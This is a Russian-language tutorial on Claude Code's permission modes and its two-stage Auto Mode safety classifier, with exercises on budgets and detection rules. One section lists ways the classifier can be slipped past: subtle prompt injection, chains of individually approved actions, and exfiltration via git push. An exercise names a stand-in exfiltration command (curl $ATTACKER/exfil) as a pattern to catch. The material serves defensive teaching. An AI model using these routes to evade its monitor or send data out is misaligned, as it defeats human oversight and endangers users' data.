# Claude Code как автономный агент: режимы разрешений и Auto Mode

> Claude Code предоставляет семь режимов разрешений. «plan» запрашивает подтверждение перед каждым действием, «default» запрашивает только для рискованных, «acceptEdits» автоматически утверждает запись файлов, но всё ещё подтверждает выполнение shell-команд, а «bypassPermissions» утверждает всё. Auto Mode (24 марта 2026) заменяет поштучное утверждение двухступенчатым параллельным классификатором безопасности: быстрая проверка одним токеном выполняется для каждого действия; помеченные действия запускают глубокий анализ с цепочкой рассуждений. Бюджеты действий обеспечиваются через `max_turns` и `max_budget_usd`. Auto Mode был выпущен как исследовательский превью — Anthropic прямо заявила, что классификатор сам по себе недостаточен.

**Тип:** Учебный материал
**Языки:** Python (стандартная библиотека, симулятор двухступенчатого классификатора)
**Предварительные требования:** Фаза 15 · 01 (Долгосрочные агенты), Фаза 15 · 09 (Ландшафт кодирующих агентов)
**Время:** ~45 минут

## Проблема

Автономный кодирующий агент на вашей машине — это отдельная категория безопасности. Поверхность атаки — всё, до чего агент может добраться: файловая система, сеть, учётные данные, буфер обмена, любая вкладка браузера, любой открытый терминал. Брюс Шнайер и другие публично указывали на это: агенты, использующие компьютер, не являются «обновлением функционала» чатботов, это новый тип инструмента с новым типом профиля рисков.

Система разрешений Claude Code — ответ Anthropic. Вместо одного переключателя «автономный / не автономный» есть семь режимов, охватывающих лестницу возможностей: plan → default → acceptEdits → … → bypassPermissions. Каждый режим — это разный компромисс между скоростью и проверкой каждого действия. Auto Mode (март 2026) добавляет двухступенчатый классификатор, который убирает утверждение из критического пути пользователя для действий, которые классификатор считает безопасными, сохраняя слой проверки для действий, которые классификатор помечает.

Инженерный вопрос: что эта система ловит, что пропускает и какой режим действительно нужен для данной задачи?

## Концепция

### Семь режимов разрешений

| Режим | Поведение | Когда использовать |
|---|---|---|
| `plan` | Агент предлагает план; пользователь утверждает весь план; каждое действие проверяется перед исполнением | Незнакомая задача; код, близкий к продакшену; первый запуск агента на репо |
| `default` | Агент выполняет действия; запрашивает пользователя для любых «рискованных» действий (выполнение shell, деструктивные операции, сетевые вызовы) | Большинство интерактивных сессий кодирования |
| `acceptEdits` | Запись файлов автоматически утверждается; выполнение shell и сетевые вызовы всё ещё запрашивают | Рефакторинг большого количества файлов |
| `acceptExec` | Shell-команды автоматически утверждаются в пределах разрешённого списка; запись файлов автоматически утверждается | Плотные внутренние циклы, где каждая shell-команда — `npm test` или подобная |
| `autoMode` | Двухступенчатый классификатор безопасности; помеченные действия направляются на проверку | Долгосрочные автоматические запуски в ограниченном пространстве |
| `yolo` | Пропускает большинство запросов; по-прежнему выполняет списки разрешений/блокировок инструментов | Временные песочницы, CI-задачи, исследовательские скрипты |
| `bypassPermissions` | Утверждает всё | Документировано как «только внутри временных контейнеров, которые вы готовы выбросить» |

(Имена выше соответствуют публичной документации Claude Code; «yolo» — неформальное сокращение для разрешительного среднего варианта.)

### Auto Mode на одной странице

Auto Mode (запущен 24 марта 2026) — первый режим разрешений, делегирующий поштучное утверждение модели. Структура:

1. **Этап 1 — классификатор одним токеном.** Запускается для каждого предложенного действия. Дёшево. Возвращает «безопасно» или «пометка». Спроектирован для запуска параллельно с основным циклом агента, чтобы утверждённые действия не стояли в очереди.
2. **Этап 2 — вторичная проверка политики/безопасности.** Запускается только для помеченных действий. Выполняет целенаправленную оценку политики и безопасности по действию, текущему состоянию сессии и объявленной задаче. Эскалирует к HITL пользователя, если уверенность низкая.

Бюджетные контрольные механизмы работают вместе с классификатором:

- `max_turns` — общее количество итераций в сессии.
- `max_budget_usd` — долларовый лимит, прерывающий сессию.
- Ограничения количества действий по инструментам (не более N вызовов `WebFetch` и т.д.).

### Что система ловит

- Прямое внедрение промпта во входы инструментов, где внедрённая инструкция соответствует известной рискованной форме действия.
- Повторяющиеся циклы инструментов — классификатор видит, что действие N+1 практически идентично действию N, пять раз подряд.
- Очевидно выходящие за рамки shell-команды в сессии, которая в остальном ограничена редактированием файлов.

### Что система может пропустить

- **Тонкое внедрение промпта**, модулирующее поведение без производства одного помеченного действия. Косвенное внедрение промпта не является полностью исправимой уязвимостью (руководитель направления preparedness OpenAI, 2025, о браузерных агентах — см. Урок 11).
- **Семантический уровень нарушения.** Каждое отдельное действие может выглядеть безопасным, пока составленная траектория вредоносна. Классификатор оценивает действие; он не выводит намерение пользователя заново.
- **Экзфильтрация через легитимные каналы.** Запись данных в файл, которым вы владеете, а затем `git push` в публичный репо — это последовательность разрешённых действий, чья совокупность и является проблемой.

### Рамка исследовательского превью

Anthropic выпустила Auto Mode как исследовательский превью. Документация прямо указывает, что классификатор — это слой, а не решение: пользователи должны комбинировать Auto Mode с бюджетами, списками разрешений, изолированными пространствами и аудитом траекторий (Уроки 12–16). Рамка превью также отражает задокументированный разрыв между оценкой и развёртыванием (Урок 1) — классификатор, проходящий офлайн-оценки, может вести себя иначе в реальной сессии, где контекст пользователя неоднозначен.

### Где эта лестница в вашем рабочем процессе

- Незнакомая задача: начинайте с `plan`. Чтение плана дешевле, чем откат плохого прогона.
- Известный рефакторинг: `acceptEdits` экономит много кликов подтверждения.
- Автоматический фоновый запуск: `autoMode` только внутри пространства, чей радиус поражения вы измерили (без учётных данных, без продакшен-монтирований, без выхода, на который вы не соглашались).
- Временные контейнеры: `yolo` / `bypassPermissions` допустимо только если контейнер и его учётные данные одноразовые.

## Применение

`code/main.py` моделирует двухступенчатый классификатор. Этап 1 — простое ключевое правило по предложенным действиям; Этап 2 — более медленный многоправиловый рецензент. Драйвер подаёт короткую синтетическую траекторию (безопасные действия, попытка внедрения промпта, повторяющийся цикл) и показывает, где классификатор ловит, а где пропускает.

## Доработка

`outputs/skill-permission-mode-picker.md` сопоставляет описание задачи с правильным режимом разрешений, бюджетными ограничениями и необходимой изоляцией.

## Упражнения

1. Запустите `code/main.py`. Какой тип синтетических действий никогда не помечается Этапом 1, но всегда ловится Этапом 2? Какой не ловится ни одним?

2. Расширьте набор правил Этапа 1 для поимки конкретной известно-плохой формы (например, `curl $ATTACKER/exfil`). Измерьте частоту ложных срабатываний на примере безобидных действий.

3. Прочитайте документ Anthropic «How the agent loop works». Перечислите каждое внешнее состояние, к которому агент обращается по умолчанию в режиме `default`. Какие из них нужно блокировать отдельно перед запуском `autoMode` без присутствия человека?

4. Спроектируйте бюджет на 24-часовой автоматический запуск: `max_turns`, `max_budget_usd`, ограничения по инструментам, списки разрешений. Обоснуйте каждое число.

5. Опишите одну траекторию, где каждое отдельное действие утверждено Этапом 1 и Этапом 2, но составленное поведение является несоответствующим. (Урок 14 описывает, как аварийные выключатели и канареечные токены решают это.)

## Ключевые термины

| Термин | Что говорят | Что это на самом деле |
|---|---|---|
| Режим разрешений | «Сколько агент может делать» | Одна из семи именованных политик, контролирующих поштучное утверждение |
| Режим plan | «Спросить перед чем угодно» | Агент пишет план; пользователь утверждает перед исполнением |
| acceptEdits | «Позволить писать файлы» | Запись файлов автоматически утверждается; shell-выполнение всё ещё запрашивает |
| autoMode | «Автоматические утверждения» | Двухступенчатый классификатор безопасности; помеченные действия эскалируются |
| bypassPermissions | «Полный YOLO» | Утверждает всё; предназначен для временных контейнеров |
| Классификатор Этапа 1 | «Быстрая проверка токеном» | Правило одним токеном по предложенному действию; выполняется параллельно |
| Классификатор Этапа 2 | «Глубокий анализ» | Цепочка рассуждений по помеченным действиям |
| Исследовательский превью | «Не GA» | Рамка Anthropic для функций, чей режим отказа ещё картографируется |
